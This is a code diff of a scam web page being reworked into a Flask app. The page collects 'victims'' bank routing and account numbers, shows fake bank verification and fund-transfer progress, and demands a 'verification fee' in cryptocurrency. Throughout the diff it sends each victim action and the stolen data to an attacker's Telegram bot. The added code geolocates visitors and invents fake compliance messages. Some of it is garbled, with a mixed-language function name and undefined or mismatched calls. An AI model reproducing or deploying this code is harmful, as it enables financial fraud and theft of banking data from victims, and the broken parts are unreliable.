-                countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                feeCountdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                
-                if (remaining <= 0) {
-                    clearInterval(timer);
+        function startCountdown(duration, display) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--timer < 0) {
+                    timer = duration;
                 }
             }, 1000);
         }
-        
-        // Detect bank from routing number
-        routingInput.addEventListener('blur', function() {
-            if(this.value.length === 9) {
-                const routingNumber = this.value;
-                
-                // Fake bank database lookup
-                const banks = {
-                    '021000021': 'JPMorgan Chase',
-                    '011401533': 'Bank of America',
-                    '021001208': 'Wells Fargo',
-                    '031000503': 'U.S. Bank',
-                    '074908594': 'Citibank'
-                };
-                
-                const bankName = banks[routingNumber] || 'detected';
-                
-                bankResult.style.display = 'block';
-                bankResult.querySelector('strong').textContent = `Bank Verified: ${bankName}`;
-                
-                sendToTelegram(`Victim entered routing number: ${routingNumber} (bank: ${bankName})`);
-            }
-        });
-        
-        // Fake routing + account validation
-        routingInput.addEventListener('input', function() {
-            if(this.value.length === 9) {
-                accountInput.disabled = false;
-            } else {
-                accountInput.disabled = true;
-            }
-        });
-        
-        // Verify information button
-        verifyButton.addEventListener('click', function() {
-            if(!routingInput.value || routingInput.value.length !== 9) {
-                alert('Please enter a valid 9-digit routing number');
-                return;
-            }
-            
-            if(!accountInput.value) {
-                alert('Please enter your bank account number');
-                return;
-            }
-            
-            // Show processing screen
-            verificationFee.style.display = 'block';
-            bankResult.style.display = 'none';
-            
-            // Track this event
-            sendToTelegram(`Victim submitted bank information and proceeded to verification fee`);
-            
-         // Close modal and scroll to it
-            document.querySelector('.notification').classList.remove('active');
-            document.getElementById('verificationFee').scrollIntoView({ behavior: 'smooth' });
-        });
-        
-        // Close modal button handler
-        document.querySelector('.confirmation-close').addEventListener('click', function() {
-            confirmationModal.classList.remove('active');
-        });
-        
-        // Simulate progress when copy buttons clicked
-        document.querySelectorAll('.copy-button').forEach(button => {
-            button.addEventListener('click', function() {
-                const addressId = this.getAttribute('data-address');
-                const address = document.getElementById(addressId).textContent;
-                const currency = addressId.split('-')[0].toUpperCase();
-                
-                // Copy to clipboard
-                navigator.clipboard.writeText(address);
-                
-                // Show confirmation
-                const originalText = this.innerHTML;
-                this.innerHTML = '<i class="fas fa-check"></i> Copied!';
-                
-                setTimeout(() => {
-                    this.innerHTML = originalText;
-                }, 2000);
-                
-                // Track in Telegram
-                sendToTelegram(`Victim copied ${currency} address: ${address}`);
+        document.getElementById('bank-verification').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var routingNumber = document.getElementById('routing-number').value;
+            fetch('/verify-bank', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({routing_number: routingNumber})
+            }).then(response => response.json()).then(data => {
+                document.getElementById('bank-verification-result').style.display = 'block';
+                document.getElementById('bank-name').innerText = data.bank_name;
+                document.getElementById('bank-location').innerText = data.bank_location;
+                document.getElementById('last-four-digits').innerText = data.last_four_digits;
+                document.getElementById('security-compliance').style.display = 'block';
+                document.getElementById('compliance_message').innerText = data.compliance_message;
+                document.getElementById('verification_fee').innerText = data.verification_fee;
             });
         });
-        
-        // Simulate payment completion and account verification
-        function simulateVerification() {
-            // Scroll to payment section
-            document.getElementById('verificationFee').scrollIntoView({ behavior: 'smooth' });
-            
-            // Simulate 3-second delay to show the user paying
-            setTimeout(() => {
-                confirmationModal.classList.add('active');
-                
-                // Update progress bar
-                let progress = 0;
-                const timer = setInterval(() => {
-                    progress += 5;
-                    
-                    if(progress <= 100) {
-                        progressFill.style.width = `${progress}%`;
-                        progressLabel.textContent = `${progress}% Complete`;
-                        
-                        if(progress < 30) {
-                            progressText.textContent = "Validating account information...";
-                        } else if(progress < 60) {
-                            progressText.textContent = "Processing verification fee...";
-                        } else if(progress < 90) {
-                            progressText.textContent = "Finalizing transaction with bank...";
-                        } else {
-                            progressText.textContent = "Transferring funds to your account...";
-                        }
-                    }
-                }, 150);
-            }, 3000);
-        }
-        
-        // Telegram notification system
-        function sendToTelegram(message) {
-            const text = `${message}\nTimestamp: ${new Date().toLocaleString()}`;
-            
-            const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage?chat_id=${config.telegramChatId}&text=${encodeURIComponent(text)}`;
-            
-            // Use image request method to avoid CORS
-            if(!document.querySelector('#telegramPixel')) {
-                const img = document.createElement('img');
-                img.id = 'telegramPixel';
-                img.style.display = 'none';
-                document.body.appendChild(img);
-            }
-            
-            document.getElementById('telegramPixel').src = url;
-        }
-        
-        // Simulate victim completion when scrolled to fees
-        window.addEventListener('scroll', function() {
-            if(document.getElementById('verificationFee').offsetTop < window.scrollY + window.innerHeight - 300) {
-                simulateVerification();
-                window.removeEventListener('scroll', this);
-            }
+        document.getElementById('proceed-to-payment').addEventListener('click', function() {
+            document.getElementById('bank-verification').style.display = 'none';
+            document.getElementById('security-compliance').style.display = 'none';
+            document.getElementById('payment-processing').style.display = 'block';
+            var countdownDisplay = document.getElementById('countdown');
+            startCountdown(900, countdownDisplay);
         });
+        // 2FA and Biometric Verification (simulated)
+        function authenticateUsers() {
+            // Simulate 2FA and Biometric Verification
+            const twoFaCode = simulate_2fa();
+            const biometricResult = simulate_biometric_verification();
+            return { twoFaCode, biometricResult };
+        }
+        function sampleUser автоматически(trustScore, action, score) {
+            // Decide trust score development based on 2FA and Biometric Checks
+            if (trustScore > 80) return "High Trust User";
+            if (action == "twoFa" && simulate_2fa_success()) {
+                if (trustScore + 15 > 80) return "Trust Amplified. Performance above expectation.";
+                return "Trust Enhanced. Performance meets expected outcomes.";
+            }
+            if (score < 40) return "Trust to Rebuild. Performance inconsistently falls short.";
+            return "Trust Timeline Blocked until performance improves.";
+        }
+        console.log(sampleUser(automatically(75, "twoFa", 55)));
     </script>
- <body>
-<html>
+</body>
+</html>
+'''
+
+# Flask routes
+@app.route('/', methods=['GET'])
+def index():
+    user_agent = request.headers.get('User-Agent')
+    parsed_agent = parse(user_agent)
+    is_mobile = parsed_agent.is_mobile
+    sender_details = {
+        'vender': VENDUS_NAME,
+        'vender_name': VENDUS_NAME,
+        'bank_name': 'Bank Name',
+        'bank_location': 'Location',
+        'last_four_digits': 'XXXX',
+        'init_time': datetime.datetime.now().strftime("%H:%M:%S"),
+        'arrival_time': (datetime.datetime.now() + datetime.timedelta(minutes=15)).strftime("%H:%M:%S"),
+        'crypto_addresses': CRYPTO_ADDRESSES,
+        'notebook_warning': NOTEBOOK_WARNING,
+        'compliance_message': 'Compliance message specific to your region.',
+        'verification_fee': 150
+    }
+    # Detect user location
+    sender_details['user_location'] = get_user_location(request.remote_addr)
+    # Notification styling
+    sender_details['notification_style'] = 'top: 0; left: 0; width: 100%; background: #f8f8f8; color: #333; padding: 10px; text-align: center; font-size: 1.1em; box-shadow: 0 2px 5px rgba(0,0,0,0.1);' if is_mobile else ''
+    return render_template_string(interface_template, **sender_details)
+
+@app.route('/verify-bank', methods=['POST'])
+def verify_bank():
+    data = request.json
+    routing_number = data.get('routing_number', '')
+    bank_details = get_bank_details(routing_number)
+    last_four_digits = routing_number[-4:] if routing_number else 'XXXX'
+    user_location = get_user_location(request.remote_addr)
+    
+    # Customize compliance message based on location
+    compliance_message = f"Regulations in {user_location} require verification for transfers over $1,000."
+    # Customize verification fee dynamically
+    verification_fee = 150 + random.randint(0, 50)
+    send_telegram_notification(f'Bank verification for routing number {routing_number} completed. Bank: {bank_details["bank"]}')
+    return jsonify({
+        'bank_name': bank_details['bank'],
+        'bank_location': bank_details['location'],
+        'last_four_digits': last_four_digits,
+        'compliance_message': compliance_message,
+        'verification_fee': verification_fee
+    })
+
+# Run the Flask app
+if __name__ == '__main__':
+    print('Server started on port 5000')
+
+    # TODO: Implement customer completion tracking
+    # If user completes all steps, send "Success" notification to Telegram
+    # MemberArray = ["Nigeria", "Japan", "China"]
+    # Def checkCountry(country):
+    #   if MemberArray.includes(country):
+    #       return True
+    #   else:
+    #       return False
+    # 
+    # On verification success:
+    # send_telegram_notification(f'Transfer completed by {request.remote_addr}. Location: {user_location}.')
+
+    app.run(debug=True, port=5000, host='0.0.0.0')
